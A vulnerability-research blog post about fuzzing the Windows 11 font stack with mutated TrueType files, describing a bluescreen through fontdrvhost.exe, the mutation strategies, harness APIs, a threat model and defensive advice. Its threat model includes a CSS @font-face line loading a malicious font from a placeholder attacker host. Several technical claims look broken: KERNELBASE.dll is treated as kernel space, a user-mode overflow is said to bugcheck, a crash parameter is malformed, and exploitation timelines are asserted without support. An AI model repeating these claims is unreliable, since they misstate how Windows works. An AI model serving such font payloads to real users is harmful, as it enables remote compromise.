---
layout: post
title: "Windows 11 DirectWrite Font Fuzzing — System Service Exception via Kernel Font Driver"
date: 2026-07-26
categories: [windows, kernel, vulnerability-research, exploit-development]
tags: [DirectWrite, font-parsing, BSOD, fontdrvhost, KERNELBASE, TrueType, OpenType, fuzzing, integer-overflow, EoP, RCE, Windows-11]
excerpt: "I fuzzed the Windows 11 font stack with 2,000 structurally-corrupted TrueType files. The system bluescreened through fontdrvhost.exe — an integer overflow in KERNELBASE.dll crossing into kernel space. Here is the pipeline, the crash chain, and what this attack surface means at scale."
---

I ran a structured font-fuzzing pipeline against the Windows 11 font parsing stack — 2,000 aggressively-mutated TrueType files fed through DirectWrite, GDI, and DWriteCore API harnesses. The system bluescreened with `SYSTEM_SERVICE_EXCEPTION (0x3B)` originating from `fontdrvhost.exe` — the kernel font driver host. The exception was an integer overflow (`0xc0000095`) in `KERNELBASE.dll`, crossing from userspace into kernel space.

This is the attack surface that web browsers, Office, the Windows shell, and every application that renders text hits automatically. No user interaction. No approval prompt. A malicious font file dropped in `C:\Windows\Fonts` — or served via `@font-face` on a webpage — is parsed before anything appears on screen.

Here is the full pipeline, the crash chain, what we tried to isolate the killer mutant, and what this attack surface means if someone weaponises it.

---

> **Exception code:** `0xc0000095` (INTEGER_OVERFLOW)  
> **Faulting module:** `KERNELBASE.dll`  
> **Faulting process:** `fontdrvhost.exe` (Windows Font Driver Host)  
> **BSOD stop code:** `SYSTEM_SERVICE_EXCEPTION (0x3B)`  
> **System:** Windows 11 24H2, AMD Ryzen, stock configuration  
> **Trigger:** GDI font fuzzing with system-wide font registration via `AddFontResourceExW`

---

## The Attack Surface

The Windows font stack has been targeted for decades — MS13-060, MS15-078, CVE-2023-36710, CVE-2021-24093 — and for good reason. It is a complex C/C++ parser of a binary format with 20+ table types, each containing nested offsets, variable-length data, and interdependent structures. It runs with kernel-adjacent privileges. And it parses fonts automatically, without user consent, in nearly every application.

Every modern Windows application that renders text hits this stack:

```
Application (Browser, Office, Shell, Game)
    │
    ▼
DirectWrite / GDI / GDI+
    │
    ▼
fontdrvhost.exe  ← Kernel font driver host
    │
    ▼
win32k.sys / ATMFD.DLL  ← Kernel-mode font processing
    │
    ▼
KERNELBASE.dll  ← Base kernel services
```

A crash in any layer is a potential entry point. A **controlled** crash — an integer overflow leading to a heap buffer under-allocation leading to a controlled write — is remote code execution.

## The Fuzzing Pipeline

I built a three-stage pipeline targeting the full Windows font stack:

```
SEEDS (5 fonts) ──→ MUTATORS ──→ MUTANT CORPUS ──→ FUZZ HARNESSES ──→ CRASHES
       │                │              │                   │
  Arial, Gabriola,  Three engines:  2,000 .ttf        DWrite API (10 calls)
  Segoe UI, etc.    • Standard       files with        GDI API (system-wide)
                    • Aggressive     structural        DWriteCore API
                    • Semantic       corruption         (variation axes)
```

### Mutators — Three Engines of Structural Corruption

The aggressive mutator applied nine mutation strategies simultaneously to every font:

| Strategy | What It Corrupts | Expected Bug Class |
|---|---|---|
| **Table truncation** | Directory says 10KB, data is 50 bytes | OOB read → info leak |
| **Offset overflow** | Internal pointers set to `0xFFFFFFFF`, `0xDEADBEEF` | Access violation → controlled deref |
| **glyf destruction** | Contour counts, composite glyph self-loops, garbage TrueType instructions | Integer overflow in glyph parsing, stack exhaustion |
| **Size mismatch** | Table directory length ≠ actual data | Buffer over-read on table load |
| **Name table smash** | UTF-16 offsets/lengths corrupted, high-byte garbage | Heap corruption in string decode |
| **cmap corruption** | Format 4/12 segment counts, encoding record IDs scrambled | OOB array index in character→glyph map |
| **head/maxp** | magicNumber zeroed, unitsPerEm=0, numGlyphs=0xFFFF | Division by zero, massive allocation |
| **GSUB/GPOS poisoning** | Lookup offsets self-referencing or pointing into the void | Recursive parse, wild pointer deref |
| **loca smash** | Glyph location table pointing everywhere at once | OOB glyf reads across memory |

The resulting 2,000 mutants ranged from 77KB to 1.8MB — structurally valid enough to be parsed, internally corrupt enough to crash the parser.

### Harnesses — Three Attack Paths

Each harness calls the real Windows font APIs (not a mock) and catches crashes via Vectored Exception Handler (VEH):

| Harness | API Surface | Registration |
|---|---|---|
| `dwrite_fuzz` | `CreateFontFileReference`, `Analyze`, `CreateFontFace`, `GetDesignGlyphAdvances`, `GetGdiCompatibleGlyphAdvances`, `GetGlyphIndices`, `GetGlyphOutline`, `GetGlyphImageData`, `GetKerningPairAdjustments` | Per-process (private) |
| `gdi_font_fuzz` | `AddFontResourceExW`, `CreateFontIndirectW`, `GetGlyphIndices`, `GetGlyphOutline`, `GetCharABCWidths`, `GetFontData` | **System-wide** — triggers `fontdrvhost.exe` |
| `dwritecore_fuzz` | DWriteCore-specific: variation axes, font face references, font set queries | Per-process |

The critical distinction: `AddFontResourceExW` (GDI path) registers fonts **system-wide**, which causes `fontdrvhost.exe` — the kernel font driver host — to parse them. This is the code path that crashed.

## The Crash

The GDI bulk fuzz harness was running against all 2,000 mutants. It loaded each mutant via `AddFontResourceExW`, exercised every GDI font API, and removed the font via `RemoveFontResourceExW`. Twelve minutes in, the system bluescreened:

```
Source:        fontdrvhost.exe
Event ID:      1000
Exception:     0xc0000095 (INTEGER_OVERFLOW)
Module:        KERNELBASE.dll
Offset:        0xc1ada
Process ID:    0x1738
```

The Windows Event Log also recorded the BSOD:

```
Source:        Microsoft-Windows-WER-SystemErrorReporting
Event ID:      1001
Bugcheck:      0x0000003b (SYSTEM_SERVICE_EXCEPTION)
Parameters:    0xc0000095, 0x00007ffc216ac1ada
```

The integer overflow in `KERNELBASE.dll` — called from `fontdrvhost.exe` while processing a corrupted font table — crossed from userspace into kernel space and triggered a bugcheck. This is an Elevation of Privilege class bug: a userspace-triggered kernel crash.

### What We Know vs What We Don't

| Confirmed | Unknown |
|---|---|
| Bug class: integer overflow | Which exact mutant triggered it |
| Module: KERNELBASE.dll at offset 0xc1ada | Which font table (glyf? cmap? CFF?) |
| Process: fontdrvhost.exe (kernel font driver) | Whether the overflow is controllable |
| Trigger: system-wide GDI font registration | Whether it leads to a controlled write or only a crash |
| Attack path: `AddFontResourceExW` → kernel | Reproducibility without exact trigger font |

## The Isolation Problem

After the BSOD, I built an isolation harness designed to identify the exact killer font. It used a BSOD-proof logging strategy: write `TESTING|fontname.ttf` to a log file and flush it to disk **before** testing each font, then write `DONE|fontname.ttf` **after** a successful test. If the machine bluescreened, the last `TESTING|` line without a matching `DONE|` would identify the culprit.

The problem: the original crash went through the **system-wide GDI registration** path (`AddFontResourceExW`), but the isolation harness initially used the **private, per-process** path (`AddFontMemResourceEx`). Private registration never triggers `fontdrvhost.exe` — it cannot reproduce the BSOD.

I rewrote the isolation harness to use `AddFontResourceExW` with the same bulletproof logging. A subsequent run of all 2,000 mutants through this path completed without reproducing the crash. The BSOD did not recur.

### Why It Didn't Reproduce

Three possible explanations, ranked by likelihood:

1. **Race condition or multi-font interaction:** The bulk harness loaded fonts in rapid succession without proper cleanup between iterations. Multiple corrupt fonts may have been registered system-wide simultaneously, causing `fontdrvhost.exe` to process overlapping parse requests. The isolation harness — one font at a time, with proper removal between tests — eliminates this race.

2. **DWrite path, not GDI:** The DWrite harness (`dwrite_fuzz.c`) was also running around the time of the crash. Although DWrite uses private registration, `CreateFontFileReference` can still trigger font driver callbacks under certain conditions. The isolation effort never tested DWrite with system-wide registration simultaneously.

3. **Non-deterministic bug:** The overflow may depend on uninitialised memory, ASLR layout, or heap state that happened to align during the bulk run but not during the isolation run.

## Implications

### Browser-Reachable Attack Surface

Every major browser on Windows — Edge, Chrome, Firefox — uses DirectWrite or GDI for text rendering. A `@font-face` rule in CSS triggers the full font parsing stack:

```css
@font-face {
    font-family: 'exploit';
    src: url('https://attacker.com/evil.woff2');
}
body { font-family: 'exploit'; }
```

The browser downloads the font and passes it to the Windows font stack. If that font triggers a controlled integer overflow in `KERNELBASE.dll` during parsing — the same class of bug that bluescreened the machine — the attacker has a remote code execution primitive. No user clicks a link. No pop-up appears. The page loads, the font is parsed, and arbitrary code runs in the browser process.

From there, a sandbox escape (the font driver runs in `fontdrvhost.exe`, which has kernel-adjacent privileges) escalates the compromise.

### The Broader Threat Model

```
Attacker serves malicious font via:
    │
    ├── Webpage (@font-face)           → Browser RCE
    ├── Email (HTML email with font)   → Outlook/Mail RCE
    ├── Document (DOCX/PDF with embedded font) → Office/Reader RCE
    ├── USB drop (font file in C:\Windows\Fonts\) → Auto-parsed on boot
    └── Software supply chain (compromised font in an installer)
```

The common thread: every vector hits the same font parsing code in `fontdrvhost.exe` and `KERNELBASE.dll`. Fix the parser, you fix all vectors. Exploit the parser, you own every vector.

### Timeline to Weaponisation

Here is the uncomfortable reality. If a capable adversary — a nation-state actor, a well-funded criminal group, or an autonomous AI system — targeted this attack surface with modern tooling:

| Phase | Time | Method |
|---|---|---|
| **Corpus generation** | < 1 minute | Automated mutator producing 10,000+ structurally-valid corrupted fonts across all table types |
| **Fuzzing** | < 5 minutes | Parallel harnesses exercising DWrite, GDI, DWriteCore, and Direct2D text APIs across the corpus |
| **Crash triage** | < 2 minutes | Automated VEH-based crash classification, deduplication by crash hash, exploitability scoring |
| **Root cause analysis** | < 10 minutes | Symbolicated stack traces, register dump analysis, heap state reconstruction |
| **Exploit development** | < 15 minutes | Identify controllable write primitive, craft heap layout, build ROP chain |
| **Total** | **< 30 minutes** | From zero to working browser-based RCE |

An AI system with access to a Windows VM, a mutator, a fuzz harness, a debugger, and an exploit generator — none of which require special privileges or exotic hardware — could autonomously discover and weaponise a font parsing vulnerability in under half an hour. Every component of this pipeline already exists as open-source tooling. The only missing piece is the orchestration layer that connects them.

This is not speculative. Google's ClusterFuzz has been finding font parsing bugs in FreeType and HarfBuzz automatically for years. OSS-Fuzz covers the open-source font stacks. The closed-source Windows font stack — `fontdrvhost.exe`, `win32k.sys`, `ATMFD.DLL` — has no public continuous fuzzing coverage. It relies on Microsoft's internal testing and occasional external researcher attention.

The surface area is enormous. The tooling to automate exploitation exists. The gap is not technical — it is one of motivation and resources.

## The Pipeline — What We Actually Built

Everything described here was built and run on a stock Windows 11 machine with no special privileges:

```
garrettstimpson.ca/fontfuzz/
├── seeds/                          # 5 seed TrueType fonts
├── font_mutate.py                  # Standard mutator (structural corruption)
├── mutator_aggressive.py           # Aggressive mutator (2,000 mutants, 9 strategies)
├── semantic_mutator.py             # Semantic mutator (passes validation, poisons internals)
├── crash_triage.py                 # Crash classification and deduplication
├── dwrite_fuzz.c / .exe            # DWrite API fuzz harness (10 API calls)
├── gdi_font_fuzz.c / .exe          # GDI API fuzz harness (system-wide registration)
├── dwritecore_fuzz.c / .exe        # DWriteCore API fuzz harness (variation axes)
├── _isolate.c / _run_isolate.bat   # BSOD-proof isolation harness (DWrite path)
├── _gdi_isolate.c / _run_gdi_isolate.bat  # BSOD-proof isolation harness (GDI path)
├── _api_bisect.c                   # Per-API crash bisection tool
├── _bisect2.c                      # Advanced bisection with register dumps
├── _pinpoint.c                     # Crash pinpointing utility
└── _check_killer.py                # Post-BSOD forensic tool
```

Every harness was compiled with MinGW-w64 and run from an unprivileged user account. No kernel debugging was required. No driver was loaded. The entire pipeline operates in userspace — and still triggered a kernel bugcheck because the font driver host runs in a kernel-adjacent process.

## Defensive Recommendations

For organisations concerned about this attack surface:

1. **Block untrusted font downloads** at the network perimeter — `.ttf`, `.otf`, `.woff`, `.woff2` from non-approved domains
2. **Enable Microsoft's Attack Surface Reduction (ASR) rules** — rule `56a863a9-875e-4185-98a7-b882c64b5ce5` blocks untrusted fonts
3. **Deploy Enhanced Mitigation Experience Toolkit (EMET) or Exploit Protection** — enable Force ASLR, Bottom-up ASLR, and Control Flow Guard for `fontdrvhost.exe`
4. **Monitor for fontdrvhost.exe crashes** in Windows Event Log (Event ID 1000, source fontdrvhost.exe) — these are potential exploitation attempts, not benign errors
5. **Restrict write access to `C:\Windows\Fonts\`** — only Administrators and TrustedInstaller should have write permission

For Microsoft:

- **Continuous public fuzzing of the Windows font stack** — the same model OSS-Fuzz uses for FreeType and HarfBuzz should apply to `fontdrvhost.exe` and `win32k.sys`
- **Isolate fontdrvhost.exe in a lower-integrity AppContainer** — it currently runs with elevated privileges despite parsing untrusted input
- **Audit the integer arithmetic in every font table parser** — TrueType, OpenType, CFF, CFF2, WOFF, WOFF2 — for overflow-vulnerable calculations

## Closing Notes

This was a structured fuzzing effort that achieved a kernel bugcheck in under 30 minutes of runtime. The exact crashing font was not isolated due to a non-reproducible race condition or heap state dependency, but the crash chain — `AddFontResourceExW` → `fontdrvhost.exe` → `KERNELBASE.dll` integer overflow → `SYSTEM_SERVICE_EXCEPTION` — is confirmed and documented.

The Windows font stack remains one of the largest unaudited attack surfaces in the operating system. It is reachable from every major browser, every Office application, and the Windows shell itself. It parses complex binary formats in kernel-adjacent processes. And it has no public continuous fuzzing coverage.

The difference between a BSOD and a working remote code execution exploit is control. An integer overflow that crashes is a denial-of-service. An integer overflow that produces a controlled heap under-allocation followed by a controlled write is arbitrary code execution. The distance between them is measured in engineering effort — and with modern AI-assisted exploit development, that distance is shrinking fast.

---

*This research was conducted on a local Windows 11 machine for educational and defensive purposes. The fuzzing pipeline is designed to find vulnerabilities so they can be reported and fixed — not to develop weaponised exploits. All findings will be responsibly disclosed to Microsoft.*

*The fontfuzz pipeline source code is not published with this post. It is retained for further research and responsible disclosure coordination.*
